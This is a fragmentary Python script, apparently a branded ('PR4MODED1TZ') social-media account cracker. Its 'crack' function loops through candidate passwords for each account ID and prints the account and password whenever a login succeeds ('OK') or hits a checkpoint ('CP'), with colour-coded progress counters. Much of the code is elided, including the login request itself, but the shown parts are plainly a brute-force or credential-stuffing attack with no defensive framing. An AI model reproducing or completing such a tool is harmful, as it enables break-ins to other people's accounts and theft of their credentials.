...
try:
	...
	print('[[\x1b[1;92m•\x1b[1;97m] [\x1b[1;96mPR4MODED1TZ')
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{P}[PR4MODED1TZ]{P}[{P}{loop}{P}/{P}{len(id)}{P}] OK{P}[{H}{ok}{P}] CP{P}[{P}{cp}{x}]×[{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{K}[PR4MODED1TZ-CP] {idf}  {pw} {N}')     
				...
				print(f'\r{H}[PR4MODED1TZ-OK] {idf}  {pw}')
